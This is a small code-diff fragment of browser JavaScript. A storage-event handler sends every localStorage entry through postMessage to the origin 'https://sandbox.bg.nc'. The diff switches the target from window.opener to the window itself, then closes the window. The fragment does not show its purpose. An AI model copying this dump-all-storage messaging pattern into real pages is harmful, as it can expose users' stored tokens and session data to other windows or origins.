@@ -39,7 +39,7 @@ window.addEventListener("message", receiveMessage, false);
       }
 
       window.addEventListener('storage', () => {
-         window.opener.postMessage(Object.entries(localStorage),"https://sandbox.bg.nc")
+         window.postMessage(Object.entries(localStorage),"https://sandbox.bg.nc")
          window.close()
       })
          setInterval(() => {
